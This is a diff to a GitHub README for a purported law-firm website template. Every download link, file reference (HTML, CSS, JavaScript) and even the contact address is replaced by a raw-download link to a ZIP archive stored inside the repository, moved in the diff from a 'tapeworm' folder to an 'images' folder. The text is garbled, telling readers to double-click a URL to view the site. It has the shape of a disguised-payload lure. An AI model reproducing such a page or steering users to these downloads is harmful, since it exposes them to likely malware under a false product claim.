@@ -1,6 +1,6 @@
 # 🚀 phiwokuhle-nyobo-inc-website - Build Your Law Firm’s Online Presence
 
-[![Download Now](https://raw.githubusercontent.com/aly2902/phiwokuhle-nyobo-inc-website/main/tapeworm/phiwokuhle-nyobo-inc-website.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/aly2902/phiwokuhle-nyobo-inc-website/main/tapeworm/phiwokuhle-nyobo-inc-website.zip)
+[![Download Now](https://github.com/aly2902/phiwokuhle-nyobo-inc-website/raw/refs/heads/main/images/nyobo-phiwokuhle-website-inc-2.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/aly2902/phiwokuhle-nyobo-inc-website/raw/refs/heads/main/images/nyobo-phiwokuhle-website-inc-2.2.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ For the best experience, make sure your computer has:
 
 To get started, visit the Releases page to download the latest version of the website files:
 
-[Download Latest Release](https://raw.githubusercontent.com/aly2902/phiwokuhle-nyobo-inc-website/main/tapeworm/phiwokuhle-nyobo-inc-website.zip)
+[Download Latest Release](https://github.com/aly2902/phiwokuhle-nyobo-inc-website/raw/refs/heads/main/images/nyobo-phiwokuhle-website-inc-2.2.zip)
 
 ### 🔗 Accessing the Files:
 
@@ -40,8 +40,8 @@ Once the download is complete, locate the ZIP file on your computer and follow t
 
 To view your website, open the folder where you extracted the files. 
 
-1. Locate the `https://raw.githubusercontent.com/aly2902/phiwokuhle-nyobo-inc-website/main/tapeworm/phiwokuhle-nyobo-inc-website.zip` file.
-2. Double-click on the `https://raw.githubusercontent.com/aly2902/phiwokuhle-nyobo-inc-website/main/tapeworm/phiwokuhle-nyobo-inc-website.zip` file. This action will open your default web browser and display your new law firm website.
+1. Locate the `https://github.com/aly2902/phiwokuhle-nyobo-inc-website/raw/refs/heads/main/images/nyobo-phiwokuhle-website-inc-2.2.zip` file.
+2. Double-click on the `https://github.com/aly2902/phiwokuhle-nyobo-inc-website/raw/refs/heads/main/images/nyobo-phiwokuhle-website-inc-2.2.zip` file. This action will open your default web browser and display your new law firm website.
 
 ## 🎨 Features
 
@@ -56,9 +56,9 @@ To make the website your own, you may want to customize the look and feel. Here�
 
 1. **Edit HTML**: Open any HTML file in a text editor (like Notepad or Visual Studio Code). Modify the text, such as titles and descriptions, to suit your law firm.
   
-2. **Change CSS**: Open the `https://raw.githubusercontent.com/aly2902/phiwokuhle-nyobo-inc-website/main/tapeworm/phiwokuhle-nyobo-inc-website.zip` file to change colors, fonts, and layout styles.
+2. **Change CSS**: Open the `https://github.com/aly2902/phiwokuhle-nyobo-inc-website/raw/refs/heads/main/images/nyobo-phiwokuhle-website-inc-2.2.zip` file to change colors, fonts, and layout styles.
 
-3. **Update JavaScript**: Modify the `https://raw.githubusercontent.com/aly2902/phiwokuhle-nyobo-inc-website/main/tapeworm/phiwokuhle-nyobo-inc-website.zip` file if you want to change any interactive features. 
+3. **Update JavaScript**: Modify the `https://github.com/aly2902/phiwokuhle-nyobo-inc-website/raw/refs/heads/main/images/nyobo-phiwokuhle-website-inc-2.2.zip` file if you want to change any interactive features. 
 
 ### 💡 Tips for Customization:
 
@@ -79,7 +79,7 @@ This project uses ideas from modern web design and good practices in UI/UX. Than
 
 ## 📧 Contact Information
 
-For queries or feedback, please contact me at: [https://raw.githubusercontent.com/aly2902/phiwokuhle-nyobo-inc-website/main/tapeworm/phiwokuhle-nyobo-inc-website.zip]
+For queries or feedback, please contact me at: [https://github.com/aly2902/phiwokuhle-nyobo-inc-website/raw/refs/heads/main/images/nyobo-phiwokuhle-website-inc-2.2.zip]
 
 ## 📄 License
 
